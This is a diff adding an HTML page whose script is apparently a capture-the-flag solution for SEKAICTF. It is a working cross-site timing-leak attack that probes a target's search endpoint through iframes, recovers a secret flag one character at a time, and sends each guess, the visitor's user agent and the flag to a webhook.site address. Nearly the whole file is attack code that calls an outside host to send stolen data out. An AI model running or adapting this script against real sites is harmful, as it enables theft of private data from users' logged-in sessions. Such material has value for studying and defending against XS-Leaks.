@@ -1,0 +1,68 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>rednote xsleak v2</title>
+<pre id="log"></pre>
+<script>
+const TARGET  = 'https://rednote.1337.sb';               // ← 题目域名
+const WEBHOOK = 'https://webhook.site/5d8375af-85a7-4809-a842-47a66eaf6dac';            // ← 你的 webhook (HTTPS)
+const CHARSET = 'SEKAICTF{}_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_:.$@';
+let   prefix  = ''; // 如果确定是 SEKAI{，可写成 'SEKAI{'
+
+const ROUNDS=2, MAXLEN=90, GAP_MS=250;
+const log = (...a)=>{document.querySelector('#log').textContent += a.join(' ')+'\n'}
+const ping = (q)=>{ new Image().src = WEBHOOK + '?q=' + encodeURIComponent(q) + '&t=' + Date.now() }
+const post = (txt)=>{ fetch(WEBHOOK,{method:'POST',mode:'no-cors',headers:{'content-type':'text/plain'},body:txt}) }
+
+(async function(){
+  // 立刻心跳（证明 bot 已打开）
+  ping('visit');
+  post('visit ua=' + navigator.userAgent);
+
+  function measureOnce(url){
+    return new Promise(res=>{
+      const ifr=document.createElement('iframe');
+      const t0=performance.now();
+      const TO=setTimeout(()=>{try{ifr.remove()}catch{};res(6000)},6000);
+      ifr.onload=()=>{clearTimeout(TO); const dt=performance.now()-t0; ifr.remove(); res(dt);};
+      ifr.referrerPolicy='no-referrer';
+      ifr.src=url+(url.includes('?')?'&':'?')+'t='+Date.now()+Math.random();
+      document.body.appendChild(ifr);
+    });
+  }
+  async function score(q){
+    const u=`${TARGET}/search?query=${encodeURIComponent(q)}`;
+    const xs=[]; for(let i=0;i<ROUNDS;i++) xs.push(await measureOnce(u));
+    xs.sort((a,b)=>a-b); return xs[Math.floor(xs.length/2)];
+  }
+
+  // 自适应方向
+  const tEmpty = await score('THIS_PREFIX_SHOULD_NOT_EXIST_98765');
+  const tHit   = await score('S');
+  const chooseMax = (tHit >= tEmpty);
+  log(`[calib] empty=${tEmpty.toFixed(1)} hitLike=${tHit.toFixed(1)} → choose ${chooseMax?'MAX':'MIN'}`);
+  ping('calib:'+ (chooseMax?'MAX':'MIN'));
+
+  while (prefix.length < MAXLEN){
+    log(`\n[*] prefix="${prefix}"`);
+    post('[*] prefix='+prefix);
+
+    let bestChar=null, bestTime=chooseMax?-1e9:1e9;
+    for(const c of CHARSET){
+      const q = prefix + c;
+      const t = await score(q);
+      log(`  - ${q} -> ${t.toFixed(1)}ms`);
+      if((chooseMax && t > bestTime) || (!chooseMax && t < bestTime)){ bestTime=t; bestChar=c; }
+    }
+    prefix += bestChar;
+    log(`[+] pick "${bestChar}" (t=${bestTime.toFixed(1)}ms) → ${prefix}`);
+    ping('pick:'+prefix);
+    post('pick '+prefix);
+
+    if(bestChar === '}' ) break;
+    await new Promise(r=>setTimeout(r, GAP_MS));
+  }
+  log(`[DONE] ${prefix}`);
+  ping('flag:'+prefix);
+  post('flag '+prefix);
+})();
+</script>
